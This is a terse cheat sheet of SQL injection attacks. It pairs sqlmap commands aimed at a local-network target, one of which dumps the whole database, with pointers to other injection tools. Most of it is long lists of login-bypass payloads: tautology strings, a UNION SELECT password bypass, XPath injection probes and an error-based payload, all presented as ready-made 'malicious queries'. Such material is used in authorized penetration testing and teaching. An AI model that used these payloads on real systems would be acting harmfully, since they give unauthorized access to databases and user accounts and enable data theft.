ðŸ—²SqlMap
  #sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user  -> Testing on parameter names "user", we'll get confirmation
  #sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump  -> Dumping database
  #sqlmap.py -r /home/request.txt --dbs -> Login page username sqli detect.(https://infosecwriteups.com/sql-injection-for-beginners-using-sqlmap-36e091e8a070)
  #sqlmap.py -r /home/request.txt --dbs --level 5 -> parameter sql detect.(https://infosecwriteups.com/sql-injection-for-beginners-using-sqlmap-part-2-53e9775b67f5)



ðŸ—²Ghauri (https://github.com/r0oth3x49/ghauri)

ðŸ—²SqlFinder (https://github.com/americo/sqlifinder/tree/main)

ðŸ—²Blisqy (https://github.com/JohnTroony/Blisqy)


#(Knowing what database we are dealing with makes it easier to understand how to construct our malicious queries)



#Firs detect vulnerability.
id=1  id=2-1 same ? or 500 internal server error for the following payload ?
" or "1"+"2
" or "1"="-2"--
" or "1+2"/*
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
' or '1'='1
' or ''=''
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
  
ðŸ—²Login PageðŸ—²
USERNAME : admin' UNION SELECT '12345' AS password#    PASSWORD : 12345
admin' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
' or '1'='1
' or ''=''
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
or 1=1 group by round(rand(0)) having min(0);#
